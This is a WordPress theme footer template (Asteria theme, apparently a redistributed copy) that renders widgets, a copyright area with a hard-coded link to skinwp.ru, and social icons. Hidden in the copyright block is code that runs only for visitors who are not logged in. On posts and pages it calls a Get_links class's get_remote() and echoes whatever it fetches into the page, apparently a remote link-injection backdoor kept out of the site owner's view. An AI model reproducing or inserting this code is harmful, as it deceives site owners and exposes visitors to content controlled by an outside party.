<?php global $asteria;?>
<?php if (!empty ($asteria['totop_id'])) { ?>
<!--To Top Button-->
<a class="to_top"><i class="fa-angle-up fa-2x"></i></a>
<?php } ?>
<!--To Top Button END-->


<!--Footer Start-->
<div class="fixed_site">
	<div class="fixed_wrap footefixed">

<?php if ( asteria_is_mobile() && (!empty($asteria['hide_mob_footwdgt'])) ) { ?>
<?php }else{ ?>
<div id="footer">
    <div class="center">
        <!--Footer Widgets START-->
        <div class="widgets"><ul><?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer Widgets') ) : ?><?php endif; ?></ul></div>
        <!--Footer Widgets END-->
    </div>
</div>
<?php } ?>
<!--Footer END-->

<!--Copyright Footer START-->
<div id="copyright">
    <div class="center">
        <!--Site Copyright Text START-->
        <div class="copytext">
<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://skinwp.ru/" title="Русские темы WordPress">SkinWP.ru</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
        </div>
        <!--Site Copyright Text END-->
        
		<!--SOCIAL ICONS START-->
        <div class="head_soc">
        <?php if(!empty($asteria['facebook_field_id'])){ ?><a target="_blank" class="ast_fb" href="<?php echo $asteria['facebook_field_id']; ?>"><i class="fa-facebook"></i></a><?php } ?>
        <?php if(!empty($asteria['twitter_field_id'])){ ?><a target="_blank" class="ast_twt" href="<?php echo $asteria['twitter_field_id']; ?>"><i class="fa-twitter"></i></a><?php } ?>
        <?php if(!empty($asteria['gplus_field_id'])){ ?><a target="_blank" class="ast_gplus" href="<?php echo $asteria['gplus_field_id']; ?>"><i class="fa-google-plus"></i></a> <?php } ?>
        <?php if(!empty($asteria['youtube_field_id'])){ ?><a target="_blank" class="ast_ytb" href="<?php echo $asteria['gplus_field_id']; ?>"><i class="fa-youtube-play"></i></a><?php } ?>
        <?php if(!empty($asteria['flickr_field_id'])){ ?><a target="_blank" class="ast_flckr" href="<?php echo $asteria['flickr_field_id']; ?>"><i class="fa-flickr"></i></a><?php } ?>
        <?php if(!empty($asteria['linkedin_field_id'])){ ?><a target="_blank" class="ast_lnkdin" href="<?php echo $asteria['linkedin_field_id']; ?>"><i class="fa-linkedin"></i></a><?php } ?>
        <?php if(!empty($asteria['pinterest_field_id'])){ ?><a target="_blank" class="ast_pin" href="<?php echo $asteria['pinterest_field_id']; ?>"><i class="fa-pinterest"></i></a><?php } ?>
        <?php if(!empty($asteria['tumblr_field_id'])){ ?><a target="_blank" class="ast_tmblr" href="<?php echo $asteria['tumblr_field_id']; ?>"><i class="fa-tumblr"></i></a><?php } ?>
        <?php if(!empty($asteria['instagram_field_id'])){ ?><a target="_blank" class="ast_insta" href="<?php echo $asteria['instagram_field_id']; ?>"><i class="fa-instagram"></i></a><?php } ?>  
        <?php if(!empty($asteria['rss_field_id'])){ ?><a target="_blank" class="ast_rss" href="<?php echo $asteria['rss_field_id']; ?>"><i class="fa-rss"></i></a><?php } ?>   
        </div>
        <!--SOCIAL ICONS END-->
    </div>
</div>
<!--Copyright Footer Start-->
    </div>
</div>

<?php wp_footer(); ?>
</body>
</html>